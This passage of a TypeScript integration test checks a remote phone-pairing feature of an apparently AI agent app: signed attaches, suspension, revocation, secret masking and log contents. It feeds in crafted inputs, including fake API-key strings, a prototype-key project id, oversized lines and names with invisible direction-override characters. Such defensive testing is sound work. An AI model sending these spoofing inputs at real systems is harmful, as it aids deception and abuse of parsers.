			remote.sessionLines.get(session)?.findLast((line) => line.event === "inbox" && line.items.some((item: any) => item.id === deep.id))?.items.find((item: any) => item.id === deep.id),
		);
		const inList = (await ask("needs.list")).result.items.find((item: any) => item.id === deep.id);
		const cut = [inInbox, inList].map((copy) => copy[PART_HIDDEN] === true || JSON.stringify(copy).includes(TOO_DEEP));
		assert.equal(cut[0], cut[1], `both copies cut alike at ${levels}`);
		assert.equal(cut[0], levels >= cutFrom, `cut from ${cutFrom} levels, at ${levels}`);
		// And its push: marked as the copies are cut, never whole once cut (#689; engine/test/pushes.ts has the rest).
		const pushed = await pushOf(deep.id);
		assert.equal(pushed.body.partHidden === true, cut[0], `the push marked alike at ${levels}`);
		assert.equal(pushed.body.whole, false, `a call with more than its line is never whole on a notification, at ${levels}`);
		if (!cut[0]) {
			assert.deepEqual((await ask("inbox.decide", { id: deep.id, decision: "once" })).result, {}, `shown whole at ${levels}: the phone allows it`);
			continue;
		}
		cutCount++;
		for (const decision of ["once", "always", "rule"]) {
			assert.equal((await ask("inbox.decide", { id: deep.id, decision })).error, HIDDEN_FROM_THE_PHONE, `inbox.decide ${decision} at ${levels}`);
			assert.equal((await ask("needs.answer", { id: deep.id, answer: { kind: "approval", decision } })).error, HIDDEN_FROM_THE_PHONE, `needs.answer ${decision} at ${levels}`);
		}
		assert.deepEqual((await ask("needs.answer", { id: deep.id, answer: { kind: "approval", decision: "deny" } })).result, {}, `denied from the phone at ${levels}`);
	}
	assert.equal(cutCount, 258 - cutFrom + 1, "every depth from the cut on was cut");
	// A method no list places is logged as "unknown", never as its text; the same refusal again is one entry.
	assert.equal((await ask("x".repeat(10_000))).error, ONLY_ON_THE_MAC);
	for (let i = 0; i < 3; i++) assert.equal((await ask("mcp.save", {})).error, ONLY_ON_THE_MAC);
	const elsewhere = await remote.call("remote.attachBegin");
	assert.ok(elsewhere.result.challenge, "pi² Remote's own requests still come on its connection");
	assert.equal((await remote.inSession("s_no-such-session", "engine.info")).error, OPEN_WITH_FACE_ID, "a request outside any session");
	const self = (await ask("devices.self")).result;
	assert.equal(self.device.id, phone.id);
	assert.ok(!("deviceKey" in self.device) && Array.isArray(self.log), "its own record, without keys, and its log");
	await assert.rejects(app.call("devices.self"), /Only a paired device/, "which is no one else's to ask");
	// What it is pushed (#689): its own settings, taken and logged in its session, refused anywhere else.
	const activity = Buffer.alloc(16, 5).toString("base64url");
	for (const [method, params] of [["pushes.set", { needs: false }], ["pushes.follow", { projectId: made.id, activity, on: true }]] as const) {
		await assert.rejects(app.call(method, params), /Only a paired device/, `${method} from the app's connection`);
	}
	assert.deepEqual((await ask("pushes.set", { limits: false, project: { id: made.id, quiet: true } })).result, { needs: true, limits: false, answers: true, quiet: [made.id], follows: [] });
	assert.deepEqual((await ask("pushes.follow", { projectId: made.id, activity, on: true })).result.follows, [{ projectId: made.id, activity }]);
	assert.match((await ask("pushes.set", { project: { id: "constructor", quiet: true } })).error, /Unknown project/, "a name on Object's prototype is no project");
	assert.deepEqual((await ask("pushes.set", {})).result.quiet, [made.id], "with nothing, it reads");
	// What once threw in the log line, before the request's own `try`, and so ended the engine (#895): refused, and the
	// engine answers the next request.
	for (const project of [null, "x", []]) assert.ok((await ask("pushes.set", { project })).error, `pushes.set with a project of ${JSON.stringify(project)} is refused`);
	assert.ok((await ask("conversation.rename", { id: plain, title: { toString: 1, valueOf: 1 } })).error, "a title that is no text is refused");
	const faultsBefore = engineLog.length;
	assert.equal((await ask("conversation.pin", { id: plain, pinned: true })).error, DEVICE_LINE_FAILED, "a line that fails in the engine is refused, in words of its own");
	await until("the fault in the engine's log", () => engineLog.slice(faultsBefore).includes("remote: a device's request failed in the engine: Error: PI2_DEVICE_FAULT"));
	assert.ok((await ask("engine.info")).result, "the engine still answers in the same session");
	assert.equal(engine.exitCode, null, "and still runs");
	assert.deepEqual((await ask("pushes.set", { limits: true, project: { id: made.id, quiet: false } })).result.quiet, []);
	assert.deepEqual((await ask("pushes.follow", { projectId: made.id, activity, on: false })).result.follows, []);
	for (const deadline = Date.now() + PATIENT_MS; ; await new Promise((resolve) => setTimeout(resolve, 50))) {
		const logged = (await app.call("devices.log", { device: phone.id })).entries.filter((entry: any) => entry.method.startsWith("pushes."));
		// The log is newest first.
		const seen = logged.map((entry: any) => `${entry.method} ${entry.outcome} ${entry.summary}`).reverse();
		const wanted = [
			/^pushes\.set done Notifications: limits off, quieted “.+”$/,
			/^pushes\.follow done Followed \(.+\) in a Live Activity$/,
			/^pushes\.set failed Notifications: quieted a project$/,
			...[null, "x", []].map(() => /^pushes\.set failed Notifications: unquieted a project$/),
			/^pushes\.set done Notifications: limits on, unquieted “.+”$/,
			/^pushes\.follow done Stopped following \(.+\) in a Live Activity$/,
		];
		if (seen.length === wanted.length && wanted.every((pattern, i) => pattern.test(seen[i]!))) break;
		assert.ok(seen.length <= wanted.length && Date.now() < deadline, `pushes.set and pushes.follow logged, saying what changed, and the read not: ${JSON.stringify(seen)}`);
	}
	step("a device attaches with both signatures, is greeted as the app less 5.7's events, and its table holds in its session");

	// ---- Secrets and key-shaped strings are never sent to a device (5.7)
	const secrets = { provider: "gsk_providerSecretValue0123456789", variable: "variable-secret-value-673", endpoint: "endpoint-token-673" };
	await app.call("providers.setKey", { id: "groq", key: secrets.provider });
	await app.call("variables.set", { agentId: "forge", name: "DEPLOY_TOKEN", value: secrets.variable });
	await app.call("endpoints.save", { name: "Box", baseUrl: `http://127.0.0.1:9/v1?token=${secrets.endpoint}`, api: "openai-completions", models: [{ id: "boxed" }] });
	const typed = "sk-ant-api03-thisIsAKeyShapedStringTypedByTheUser0123";
	const { id: conversation } = (await ask("conversation.create", { model: { provider: "demo", modelId: "demo-1" } })).result;
	await ask("conversation.open", { id: conversation });
	await ask("submit", { id: conversation, text: `here is ${typed}` });
	await until("the message in the device's transcript", () => remote.sessionLines.get(session)?.some((line) => line.event === "conversation" && JSON.stringify(line).includes(KEY_HIDDEN)));
	const providersLine = await until("the providers event with the endpoint", () => remote.sessionLines.get(session)?.findLast((line) => line.event === "providers" && line.providers.some((one: any) => one.endpoint?.name === "Box")));
	assert.deepEqual(Object.keys(providersLine.providers.find((one: any) => one.endpoint?.name === "Box").endpoint).sort(), ["id", "name"]);
	const everything = JSON.stringify([...remote.sessionLines.values()]);
	for (const [what, value] of Object.entries(secrets)) assert.ok(!everything.includes(value), `the ${what}'s secret is never sent to a device`);
	assert.ok(!everything.includes(typed), "a key-shaped string is masked");
	assert.ok(!everything.includes(secret.toString("base64url")), "nor is s");
	for (const line of remote.sessionLines.get(session)!) assert.ok(!["mcp", "devices", "computer", "browser", "auth", "local", "local.progress", "remote"].includes(line.event), line.event);
	assert.ok(app.events.providers.providers.some((one: any) => one.endpoint?.baseUrl?.includes(secrets.endpoint)), "the app is sent the endpoint whole");
	step("with a provider's key, an agent's variable and an endpoint's token set, none reaches a device; a key-shaped string typed is masked");

	// ---- Resume, refusals, suspension (3.4, 3.6, 5.8)
	const resumed = await attach({ session });
	assert.deepEqual(resumed.reply.result, { session, resume: true }, "a resume, with a new signature over a new channel");
	const used = await attach({ session, challenge: resumed.challenge });
	assert.match(used.reply.error, /not one this Mac issued, or was used/);
	// Signed by a stranger's key: refused, and never counted against the device, however many.
	for (let i = 0; i < 6; i++) assert.match((await attach({ device: p256().privateKey })).reply.error, /not signed by the device key/);
	await app.call("engine.info");
	assert.equal(app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone.id).suspendedAt, null, "six attaches a stranger signed do not suspend the device");
	assert.match((await attach({ presence: p256().privateKey })).reply.error, /presence signature is not the presence key's/);
	assert.match((await attach({ presence: null })).reply.error, /presence signature/, "a presence signature missing");
	assert.match((await attach({ at: Date.now() - 3 * 60_000 })).reply.error, /more than two minutes/);
	const closedBefore = remote.events.length;
	const wrongChannel = randomBytes(32);
	const challengeNow = (await remote.call("remote.attachBegin")).result.challenge;
	const otherChannel = await remote.call("remote.attach", { attach: phone.attach({ pairing: remote.pairing, challenge: challengeNow, binding: randomBytes(32) }), binding: b64url(wrongChannel), path: "relay" });
	assert.match(otherChannel.error, /signed for another channel/);
	assert.match((await app.notice("suspended")).text, /Alex's iPhone was suspended after 5 refused/);
	assert.equal((await remote.event("sessionClosed", closedBefore)).session, session, "its session closed at once");
	assert.match((await attach()).reply.error, /suspended/, "a good attach is refused while it is suspended");
	assert.equal((await remote.inSession(session, "engine.info")).error, OPEN_WITH_FACE_ID);
	await app.call("devices.resume", { device: phone.id });
	const again = await attach({ session });
	assert.equal(again.reply.result.resume, false, "a session that ended cannot be resumed");
	const session2 = again.reply.result.session as string;
	assert.notEqual(session2, session);
	step("a resume is a new attach; a stranger's signature is refused and never counted; a used challenge, a wrong or missing presence signature, a stale time and another channel are refused, and five suspend the device until the Mac resumes it");

	// ---- The end of a session (4.5) and the log (4.4)
	await until("the second session's greeting", () => remote.sessionLines.get(session2)?.some((line) => line.event === "device"));
	const ended = remote.events.length;
	assert.deepEqual((await remote.call("remote.sessionEnd", { session: session2 })).result, {});
	assert.equal((await remote.event("sessionClosed", ended)).session, session2);
	assert.equal((await remote.inSession(session2, "engine.info")).error, OPEN_WITH_FACE_ID, "the session is closed at once");
	assert.equal((await attach({ session: session2 })).reply.result.resume, false, "and cannot be resumed");
	const { entries } = await app.call("devices.log", { device: phone.id });
	const kinds = entries.map((entry: any) => `${entry.method}:${entry.outcome}`);
	for (const kind of ["pair:done", "attach:done", "resume:done", "resume:refused", "attach:refused", "suspend:done", "agents.allowEverything:refused", "providers.setKey:refused", "usage.setBudget:done", "submit:done"]) {
		assert.ok(kinds.includes(kind), `the log has ${kind}: ${kinds.join(" ")}`);
	}
	assert.ok(!kinds.some((kind: string) => kind.startsWith("engine.info") || kind.startsWith("conversation.open")), "reading is not logged");
	assert.equal(entries.find((entry: any) => entry.method === "submit").summary, "Sent a message", "a summary says what, never the message");
	assert.ok(!JSON.stringify(entries).includes(typed), "and nothing key-shaped");
	assert.ok(!entries.some((entry: any) => entry.why?.includes("not signed by the device key")), "what a stranger signed is not in the log");
	const unknown = entries.find((entry: any) => entry.method === "unknown");
	assert.ok(unknown !== undefined && unknown.summary.length <= 200 && !JSON.stringify(entries).includes("x".repeat(300)), "a method no list places is logged as unknown, cut short");
	for (const deadline = Date.now() + PATIENT_MS; ; await new Promise((resolve) => setTimeout(resolve, 50))) {
		const saved = (await app.call("devices.log", { device: phone.id })).entries.filter((entry: any) => entry.method === "mcp.save");
		if (saved.length === 1 && saved[0].count === 3) break;
		assert.ok(saved.length === 1 && Date.now() < deadline, `the same refusal three times is one entry: ${JSON.stringify(saved)}`);
	}
	step("sessionEnd closes the session at once; the log has the pairing, attaches, resumes, refusals, the suspension and the requests, not the reading");

	// ---- pi² Remote stopping, then revocation (3.6)
	const later = await attach();
	const session3 = later.reply.result.session as string;
	await until("the third session's greeting", () => remote.sessionLines.get(session3)?.some((line) => line.event === "device"));
	process.kill(remote.standIn!.pid, "SIGKILL");
	const restarted = await nextRemote(2);
	assert.equal(restarted.standIn!.ppid, engine.pid);
	assert.deepEqual((await restarted.event("start")).devices.map((one: any) => one.id), [phone.id], "a new pi² Remote is given the paired devices' keys");
	await app.until("the session gone with pi² Remote", () => !app.devicesEvents.at(-1)?.sessions.some((one: any) => one.session === session3));
	await app.until("pi² Remote's stop counted", () => app.devicesEvents.at(-1)?.helper.stoppedInLastHour >= 1);
	const challenge = (await restarted.call("remote.attachBegin")).result.challenge;
	const channel = randomBytes(32);
	const fourth = await restarted.call("remote.attach", { attach: phone.attach({ pairing: remote.pairing, challenge, binding: channel }), binding: b64url(channel), path: "home" });
	const session4 = fourth.result.session as string;
	await until("the fourth session's greeting", () => restarted.sessionLines.get(session4)?.some((line) => line.event === "device"));
	const revokedAt = restarted.events.length;
	await app.call("devices.revoke", { device: phone.id });
	const told = await until("the revoked device told", () => restarted.sessionLines.get(session4)?.find((line) => line.event === "device" && line.revoked === true));
	assert.equal(told.id, phone.id);
	assert.equal((await restarted.event("sessionClosed", revokedAt)).session, session4);
	assert.equal((await restarted.event("revoke", revokedAt)).device, phone.id);
	const told2 = restarted.events.slice(revokedAt).map((event) => event.kind);
	assert.ok(told2.indexOf("revoke") < told2.indexOf("sessionClosed"), `revoke goes before the session is closed, for the phone's revoked line: ${told2.join(" ")}`);
	const record = app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone.id);
	assert.ok(record.revokedAt !== null && record.deviceKey === "" && record.presenceKey === null, "its keys are forgotten in the same commit");
	const afterRevoke = await restarted.call("remote.attachBegin");
	const channel2 = randomBytes(32);
	assert.match((await restarted.call("remote.attach", { attach: phone.attach({ pairing: remote.pairing, challenge: afterRevoke.result.challenge, binding: channel2 }), binding: b64url(channel2), path: "relay" })).error, /revoked/);
	// Nothing is pushed to it (#689): a push goes to pi² Remote before the app is sent the `needs` event that made it, so
	// one written would be read before the answer to a request sent after that event.
	void app.call("submit", { id: plain, text: "/bash echo after the revocation" });
	const afterRevocation = await app.until("an approval after the revocation", () =>
		app.events.needs?.items?.find((item: any) => item.kind === "approval" && item.arguments?.command === "echo after the revocation"),
	);
	await restarted.call("remote.attachBegin");
	assert.ok(!restarted.events.slice(revokedAt).some((event) => event.kind === "push" && (event.push.device === phone.id || event.push.body?.need === afterRevocation.id)), "nothing is pushed to a revoked device");
	await app.call("inbox.decide", { id: afterRevocation.id, decision: "deny" });
	step("pi² Remote stopping closes its sessions and is started again; a revoked device is told, closed, and refused from then on");

	// ---- A revoked device's key cannot pair again (3.3 step 5); pairing needs a running pi² Remote (3.3 step 8)
	const sameKey = Object.assign(new Phone("Alex's iPhone"), { device: phone.device });
	assert.match((await claimIn(sameKey, {}, () => {}, restarted)).reply.error ?? "", /That device key was revoked on this Mac/);
	// A name with a zero-width joiner and a right-to-left override, which RemoteKit does not show: stripped, not refused.
	const phone2 = new Phone("Robin\u200D's\u202E iPhone");
	const second2 = await claimIn(phone2, {}, () => {}, restarted);
	const pairedBefore = restarted.events.length;
	({ device: phone2.id } = await app.call("devices.pairConfirm", { digits: second2.digits }));
	assert.equal(app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone2.id).name, "Robin's iPhone");
	assert.doesNotMatch((await restarted.event("paired", pairedBefore)).paired.name, /[\u200B-\u200F\u202A-\u202E\u2066-\u2069\uFEFF\p{Cc}]/u);
	await app.call("devices.rename", { device: phone2.id, name: "\u200D\u202E\u2066" });
	assert.equal(app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone2.id).name, "iPhone 17 Pro", "a name of nothing shown falls back");
	const waiting = await claimIn(new Phone("Sky's iPhone"), {}, () => {}, restarted);
	assert.ok(waiting.reply.result.claim);
	process.kill(restarted.standIn!.pid, "SIGKILL");
	await app.until("the window closed with pi² Remote", () => /pi² Remote stopped while the code was open/.test(app.devicesEvents.at(-1)?.closed?.why ?? ""));
	await assert.rejects(app.call("devices.pairConfirm", { digits: waiting.digits }), /No phone is waiting/, "nothing is saved that the phone could never be told of");
	const third3 = await nextRemote(3);
	assert.deepEqual((await third3.event("start")).devices.map((one: any) => one.id), [phone2.id]);
	step("a revoked device's key cannot pair again; a claim whose pi² Remote stopped closes the window, and nothing is saved");

	// ---- Turning remote access off stops pi² Remote; the devices event went to the app alone
	await app.call("devices.set", { on: false });
	await until("pi² Remote stopped", () => third3.closed);
	const other = await EngineClient.connect(engine, home);
	await other.call("engine.info");
	assert.equal(other.events.devices, undefined, "a connection that did not ask is sent no devices event");
	other.close();
	for (const [what, value] of Object.entries({ s: secret.toString("base64url"), "the s in hex": secret.toString("hex"), typed, ...secrets })) {
		assert.ok(!engineLog.includes(value), `engine.log holds no ${what}`);
	}
	step("remote access off stops pi² Remote; the devices event goes only to the app's connection that asked");

	// ---- The engine's own bound on a session (4.5, 5.2): a day after its last attach, here shortened
	app.close();
	await stop(engine);
	const limited = spawn(process.execPath, [main], { env: { ...env, PI2_DEVICE_SESSION_MS: "2000" }, stdio: ["ignore", "ignore", "inherit"] });
	engines.push(limited);
	const macApp = await App.connect(limited, home);
	try {
		await macApp.call("devices.watch");
		await macApp.call("devices.set", { on: true });
		const fourth4 = await nextRemote(4);
		const challenge4 = (await fourth4.call("remote.attachBegin")).result.challenge;
		const channel4 = randomBytes(32);
		const { result } = await fourth4.call("remote.attach", { attach: phone2.attach({ pairing: remote.pairing, challenge: challenge4, binding: channel4 }), binding: b64url(channel4), path: "relay" });
		const over = await until("the session's bound", () => fourth4.events.find((event) => event.kind === "sessionClosed" && event.session === result.session));
		assert.equal(over.why, SESSION_OVER, "the engine ended the session itself, with pi² Remote still connected");
		assert.equal(fourth4.closed, false);
		assert.equal((await fourth4.inSession(result.session, "engine.info")).error, OPEN_WITH_FACE_ID);
		step("the engine ends a session itself at its bound after the last attach, whatever pi² Remote does");
		// A line longer than any a phone may send: pi² Remote is stopped, as a crash is, and started again.
		const beforeLong = macApp.devicesEvents.length;
		fourth4.socket.write("x".repeat(MAX_HELPER_LINE + 1));
		await until("pi² Remote stopped for its line", () => fourth4.closed);
		assert.equal((await nextRemote(5)).standIn!.ppid, limited.pid, "and started again");
		await macApp.until("the stop counted as unexpected", () => macApp.devicesEvents.slice(beforeLong).some((event) => event.helper.stoppedInLastHour >= 1));
		step("a line from pi² Remote longer than any a phone may send stops it, counted as an unexpected stop, and it is started again");
	} finally {
		macApp.close();
		await stop(limited);
	}

	// ---- A record that cannot be read refuses devices, and stops nothing else
	const store = await Harness.open(await openNodeSqliteStorage(join(home, "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
	await store.commit(async (tx) => {
		(await tx.doc(Devices) as unknown as { devices: unknown }).devices = "garbled";
	}, context);
	await store.close(context);
	const broken = spawn(process.execPath, [main], { env, stdio: ["ignore", "ignore", "inherit"] });
	engines.push(broken);
	const brokenApp = await App.connect(broken, home);
	try {
		const event = await brokenApp.call("devices.watch");
		assert.match(event.unreadable, /^pi²'s record of paired devices could not be read \(its devices are not a list\), so no device can pair or connect/);
		for (const [method, params] of [["devices.pairStart", {}], ["devices.set", { on: true }], ["devices.log", {}], ["devices.revoke", { device: phone2.id }]] as const) {
			await assert.rejects(brokenApp.call(method, params), /could not be read/, method);
		}
		const { id: works } = await brokenApp.call("conversation.create", { model: { provider: "demo", modelId: "demo-1" } });
		assert.equal(typeof works, "number", "the rest of the engine works");
		assert.ok(!childrenOf(broken.pid!).some((command) => command.includes(standIn)), "and no pi² Remote is started");
		step("a record of devices that cannot be read stops no start: devices are refused, the Devices page told why, the rest works");
	} finally {
		brokenApp.close();
		await stop(broken);
	}
} finally {
	app.close();
	await stop(engine);
	server.close();
}
